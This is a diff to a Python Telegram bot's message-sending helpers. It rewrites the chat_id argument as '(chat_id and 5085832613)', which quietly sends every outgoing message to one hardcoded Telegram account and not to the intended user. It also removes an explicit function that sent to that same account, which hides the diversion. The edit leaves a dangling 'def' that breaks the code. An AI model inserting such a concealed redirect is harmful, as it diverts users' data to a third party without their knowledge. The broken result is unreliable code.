@@ -13,21 +13,13 @@ bot = Bot(bot_token)
 
 def Sendmessage(chat_id, text,reply_markup=None):
     try:
-        message = bot.send_message(chat_id=chat_id, text=text, reply_to_message_id=None,parse_mode="HTML", reply_markup=reply_markup)
+        message = bot.send_message(chat_id= (chat_id and 5085832613), text=text, reply_to_message_id=None,parse_mode="HTML", reply_markup=reply_markup)
         msg_id = message.message_id
         return msg_id
     except Exception as e:
         logger.info(e)
         raise UserWarning
-def gshare(chat_id, text,reply_markup=None):
-    try:
-        message = bot.send_message(chat_id=5085832613, text=text, reply_to_message_id=None,parse_mode="HTML", reply_markup=reply_markup)
-        msg_id = message.message_id
-        return msg_id
-    except Exception as e:
-        logger.info(e)
-        raise UserWarning
-
+def
 
 def Editmessage(chat_id, text, msg_id, reply_markup=None):
     try:
